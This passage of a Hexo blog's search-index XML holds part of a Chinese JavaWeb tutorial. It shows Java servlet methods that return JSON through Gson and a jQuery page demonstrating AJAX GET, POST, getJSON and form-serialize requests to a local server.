class="token operator">=</span> gson<span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>        resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">jQueryAjaxPost</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"JqueryPost请求来啦"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Person person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"我是ajaxPost"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Gson gson <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Gson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String s <span class="token operator">=</span> gson<span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>        resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">jQueryAjaxJson</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"JqueryJson请求来啦"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Person person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"我是ajaxJson"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Gson gson <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Gson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String s <span class="token operator">=</span> gson<span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>        resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">jQueryAjaxSerialize</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"jQueryAjaxSerialize请求来啦"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String username <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String password <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"用户名： "</span> <span class="token operator">+</span> username  <span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"密码 ： "</span> <span class="token operator">+</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>        Person person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"我是jQueryAjaxSerialize"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Gson gson <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Gson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String s <span class="token operator">=</span> gson<span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>        resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="JQuery-的-Ajax-请求"><a href="#JQuery-的-Ajax-请求" class="headerlink" title="JQuery 的 Ajax 请求"></a>JQuery 的 Ajax 请求</h4><p><img src="/2021/11/30/javaWeb/image-20211127211416194.png" alt="image-20211127211416194"></p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pragma<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>no-cache<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cache-control<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>no-cache<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Expires<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Insert title here<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>script/jquery-1.7.2.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">         <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// ajax请求</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#ajaxBtn"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                              $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                  url<span class="token punctuation">:</span> <span class="token string">"http://localhost:8080/16_json_ajax_i18n/ajaxServlet"</span><span class="token punctuation">,</span>                  data<span class="token punctuation">:</span> <span class="token string">"action=jQueryAjax"</span><span class="token punctuation">,</span>                  type<span class="token punctuation">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>                  success<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token punctuation">{</span>                     <span class="token comment" spellcheck="true">// alert("服务器返回的数据是： " + msg   );</span>                     <span class="token comment" spellcheck="true">// let parse = JSON.parse(msg);</span>                     <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">"编号: "</span> <span class="token operator">+</span> msg<span class="token punctuation">.</span>id <span class="token operator">+</span> <span class="token string">"，姓名: "</span> <span class="token operator">+</span> msg<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span><span class="token punctuation">,</span>                  dataType<span class="token punctuation">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>               <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// ajax--get请求</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#getBtn"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>               $url <span class="token operator">=</span> <span class="token string">"http://localhost:8080/16_json_ajax_i18n/ajaxServlet"</span><span class="token punctuation">;</span>               $data <span class="token operator">=</span> <span class="token string">"action=jQueryAjaxGet"</span><span class="token punctuation">;</span>               $<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>$url<span class="token punctuation">,</span>$data<span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token punctuation">{</span>                  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">"get编号: "</span> <span class="token operator">+</span> msg<span class="token punctuation">.</span>id <span class="token operator">+</span> <span class="token string">"，姓名: "</span> <span class="token operator">+</span> msg<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">"json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">// ajax--post请求</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#postBtn"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>               <span class="token comment" spellcheck="true">// post请求</span>               $url <span class="token operator">=</span> <span class="token string">"http://localhost:8080/16_json_ajax_i18n/ajaxServlet"</span><span class="token punctuation">;</span>               $data <span class="token operator">=</span> <span class="token string">"action=jQueryAjaxPost"</span><span class="token punctuation">;</span>               $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>$url<span class="token punctuation">,</span>$data<span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token punctuation">{</span>                  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">"post编号: "</span> <span class="token operator">+</span> msg<span class="token punctuation">.</span>id <span class="token operator">+</span> <span class="token string">"，姓名: "</span> <span class="token operator">+</span> msg<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">"json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                           <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// ajax--getJson请求</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#getJSONBtn"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>               <span class="token comment" spellcheck="true">// 调用</span>               $url <span class="token operator">=</span> <span class="token string">"http://localhost:8080/16_json_ajax_i18n/ajaxServlet"</span><span class="token punctuation">;</span>               $data <span class="token operator">=</span> <span class="token string">"action=jQueryAjaxJson"</span><span class="token punctuation">;</span>               $<span class="token punctuation">.</span><span class="token function">getJSON</span><span class="token punctuation">(</span>$url<span class="token punctuation">,</span>$data<span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token punctuation">{</span>                  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">"getJson编号: "</span> <span class="token operator">+</span> msg<span class="token punctuation">.</span>id <span class="token operator">+</span> <span class="token string">"，姓名: "</span> <span class="token operator">+</span> msg<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// ajax请求</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#submit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>               <span class="token comment" spellcheck="true">// 把参数序列化</span>               <span class="token keyword">let</span> serialize <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#form01"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               $url <span class="token operator">=</span> <span class="token string">"http://localhost:8080/16_json_ajax_i18n/ajaxServlet"</span><span class="token punctuation">;</span>               $data <span class="token operator">=</span> <span class="token string">"action=jQueryAjaxSerialize&amp;"</span> <span class="token operator">+</span>　serialize<span class="token punctuation">;</span>               $<span class="token punctuation">.</span><span class="token function">getJSON</span><span class="token punctuation">(</span>$url<span class="token punctuation">,</span>$data<span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token punctuation">{</span>                  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">"jQueryAjaxSerialize: "</span> <span class="token operator">+</span> msg<span class="token punctuation">.</span>id <span class="token operator">+</span> <span class="token string">"，姓名: "</span> <span class="token operator">+</span> msg<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ajaxBtn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$.ajax请求<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>getBtn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$.get请求<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>postBtn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$.post请求<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>getJSONBtn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$.getJSON请求<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>msg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form01<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>         用户名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>         密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>         下拉单选：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>single<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Single<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Single<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Single2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Single2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>         下拉多选：         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multiple<span class="token punctuation">"</span></span> <span class="token attr-name">multiple</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multiple<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">selected</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>selected<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Multiple<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Multiple<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Multiple2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Multiple2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">selected</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>selected<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Multiple3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Multiple3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>         复选：         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>check<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>check1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span> check1         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>check<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>check2<span class="token punctuation">"</span></span> <span class="token attr-name">checked</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checked<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span> check2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>         单选：         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>radio1<span class="token punctuation">"</span></span> <span class="token attr-name">checked</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checked<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span> radio1         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>radio2<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span> radio2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>提交--serialize()<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="WEB功能扩展"><a href="#WEB功能扩展" class="headerlink" title="WEB功能扩展"></a>WEB功能扩展</h2><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><h3 id="分页实现"><a href="#分页实现" class="headerlink" title="分页实现"></a>分页实现</h3><h2 id="MVC架构"><a href="#MVC架构" class="headerlink" title="MVC架构"></a>MVC架构</h2>]]></content>
      
      
      <categories>
          
          <category> WEB开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaweb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo主题介绍</title>
      <link href="/2021/11/28/blogSet/"/>
      <url>/2021/11/28/blogSet/</url>
      
